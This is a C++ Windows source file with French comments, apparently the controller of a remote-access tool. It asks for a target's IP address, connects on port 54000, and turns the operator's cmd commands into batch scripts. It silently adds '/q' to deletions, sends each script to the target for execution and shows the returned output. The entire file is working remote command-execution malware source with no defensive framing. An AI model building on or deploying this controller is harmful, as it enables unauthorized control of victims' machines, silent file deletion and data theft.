#include<iostream>
#include<string>
#include <fstream>
#include<WS2tcpip.h>
#include <windows.h>
#include<shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <objbase.h>

#pragma comment (lib, "ws2_32.lib")
using namespace std;

#define SIZEMESSAGE 10000
#define PORT 54000

////////////////////////////////////////////////////////les fonctions
string SaisirIp();
void creerCarte();
string WhereIam(SOCKET serveur);
string demandeCommande(void);
string demandeRepertoire(void);
string creationScript(string commande, string repertoire, string check);
void creationCmd(string script); // en se rendant compte de sauvegarder le repertoire
void Carte(string reponse, string repertoire);// verifier si le repertoire envoyer pour un cd est correrc ou pas/SI c'est corrert on met a jour la map
void EnvoyerScript(SOCKET serveur, string filename);
void recevoir(string erreur, SOCKET serveur, string commande, string nameFile);
string gestionErreur(SOCKET serveur);

void etatConnection(SOCKET serveur,string etat);
void Programme(SOCKET serveur);
/// //////////////////////////////////////////////////////////////////


int main(void) {
	///////////////////////////////////////////////////////////conection au serveur/////////////////////////////////////////////////////////////////////////////////////////
	string ipAddress = SaisirIp();

	// Initialize WinSock
	WSAData data;
	WORD version = MAKEWORD(2, 2);
	int wsResult = WSAStartup(version, &data);
	if (wsResult != 0) {
		cerr << "Can't strart winsock, Err #" << wsResult << endl;
		return 0 ;
	}

	//Create socket

	SOCKET socketClient = socket(AF_INET, SOCK_STREAM, 0); // socket client
	if (socketClient == INVALID_SOCKET) {
		cerr << "Can't create socket socket, Err #" << WSAGetLastError() << endl;
		WSACleanup();
		return 0 ;
	}

	//Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(PORT);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

	//Connect to server

	int connResult = connect(socketClient, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR) {
		cerr << "Cant't connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(socketClient);
		WSACleanup();
		return 0 ;
	}


	///////////////////////////////////////////////////////////////Echange d'information avec le serveur////////////////////////////////////////////////////////////////////////////////////////////////////

	Programme(socketClient);

	//Gracefully close down everything
	closesocket(socketClient);
	WSACleanup();
	cout << "Je me suis deconnecter" << endl;

	return 0;
}


////////Declaration des fonctions
string SaisirIp() {
	string ip;
	cout << "Entrer l'adresse IPV4 du cible:";
	getline(cin, ip);
	return ip;
}
void creerCarte() {
	ofstream carte;
	carte.open("Carte.txt", ios::out | ios::trunc);
	carte.close();
}

string WhereIam(SOCKET serveur) {
	string where;
	char* buffer = new char[SIZEMESSAGE];
	int length = recv(serveur, buffer, SIZEMESSAGE, 0);
	where = string(buffer, 0, length);
	delete[]buffer;
	buffer = NULL;
	return where;
}
string demandeCommande(void) {
	string reponse;
	cout << "Entrer la commande cmd(Si vous voulez quitter le programme veuillez entrer*quitter*):";
	getline(cin, reponse);
	if (reponse.length() > 4) {
		if (tolower(reponse.c_str()[0]) == 'd' && tolower(reponse.c_str()[1]) == 'e' && tolower(reponse.c_str()[2]) == 'l') {
			string new_reponse = "";
			for (int i = 0; i < 3; i++) {
				new_reponse = new_reponse + reponse.c_str()[i];
			}
			new_reponse = new_reponse + " /q";
			for (int i = 3; i < reponse.length(); i++) {
				new_reponse = new_reponse + reponse.c_str()[i];
			}
			reponse = new_reponse;
		}
	}
	return reponse;
}
string demandeRepertoire(void) {
	string reponse;
	cout << "Entrer le reperatoire(Uniquement pour la commande cd.Entrez *aucun* pour les autres commandes):";
	getline(cin, reponse);
	return reponse;
}
string creationScript(string commande, string repertoire, string check) {
	string script;
	if (repertoire == "aucun") {
		script = ":begin\n@echo off\n" + commande + " >\"" + check + "\\script.txt\"" + "\nif not ERRORLEVEL 1 goto end\necho erreur>\"" + check + "\\erreur.txt\"\n:end";
	}
	else {
		script = ":begin\n@echo off\n" + commande + " " + repertoire + " >\"" + check + "\\script.txt\"" + "\nif not ERRORLEVEL 1 goto end\necho erreur>\"" + check + "\\erreur.txt\"\n:end";
	}
	return script;
}
void creationCmd(string script) {
	ofstream file;
	ifstream carte;
	string intermediaire;
	file.open("script.cmd", ios::out);
	carte.open("Carte.txt", ios::in);
	while (!carte.eof()) {
		getline(carte, intermediaire);
		intermediaire = intermediaire + "\n";
		file << intermediaire;
	}
	file << script;

	file.close();
	carte.close();
}

void Carte(string reponse, string repertoire) {
	if (reponse == "good" && repertoire != "aucun") { // mais a jour la carte seulement si la commande est valide et le repertoire n'est pas aucun
		string texte = "cd " + repertoire + "\n";
		ofstream file;
		file.open("Carte.txt", ios::app);
		file << texte;
		file.close();
		cout << "Votre position a ete mis a jour" << endl;
	}
}

void EnvoyerScript(SOCKET serveur, string filename) {
	ifstream file;
	file.open(filename, ios::binary);
	file.seekg(0, ios::end); // parcour le fichier du debut a la fin
	int length = file.tellg(); // enregister la taille du fichier(le nombre de octet du fichier)
	file.seekg(0, ios::beg);// parcour le fichier de la fin jusqu'au debut
	char* buffer = new char[length];
	file.read(buffer, length);
	send(serveur, buffer, length, 0);

	delete[]buffer; // liberer l'espace memoire
	buffer = NULL;

	file.close();
}

void recevoir(string erreur, SOCKET serveur, string commande, string nameFile) {

	if (erreur == "good") {

		cout << "*****Reponse: Votre script a ete bien excecuter*****" << endl;

		char* buffer = new char[SIZEMESSAGE];
		int length = recv(serveur, buffer, SIZEMESSAGE, 0); // recoit le texte
		ofstream texte;
		texte.open("script.txt", ios::binary);
		texte.write(buffer, length);
		texte.close();


		ifstream file;
		string contenu = "aucun";
		file.open(nameFile, ios::in);
		while (!file.eof()) {
			getline(file, contenu);
			cout << contenu << endl; // affiche le contenu du texte
		}

		delete[]buffer;

		file.close();
	}
	else {
		cout << "*****Reponse: Votre script contenait des erreurs.Veuillez verifier*****" << endl;
	}

}

string gestionErreur(SOCKET serveur) { // recevoir un string

	char* buffer = new char[SIZEMESSAGE];
	int lenght = recv(serveur, buffer, SIZEMESSAGE, 0);
	string erreur = string(buffer, 0, lenght);
	delete[]buffer;
	return erreur;
}

void etatConnection(SOCKET serveur, string etat) {
	send(serveur, etat.c_str(), etat.length(), 0);
}

void Programme(SOCKET serveur) {
	string nameScript = "script.cmd";
	string nameFile = "script.txt";
	string commande;
	string repertoire;
	string script;
	string erreur;
	creerCarte();
	string where = WhereIam(serveur);

	do {
		commande = demandeCommande();
		if (commande != "quitter") {
			etatConnection(serveur, "true");
			repertoire = demandeRepertoire();
			script = creationScript(commande, repertoire, where);
			creationCmd(script);
			EnvoyerScript(serveur, nameScript);
			erreur = gestionErreur(serveur);
			recevoir(erreur, serveur, commande, nameFile);
			Carte(erreur, repertoire);
		}
		else {
			etatConnection(serveur, "false"); // permet la deconnection
		}
	} while (commande != "quitter");
}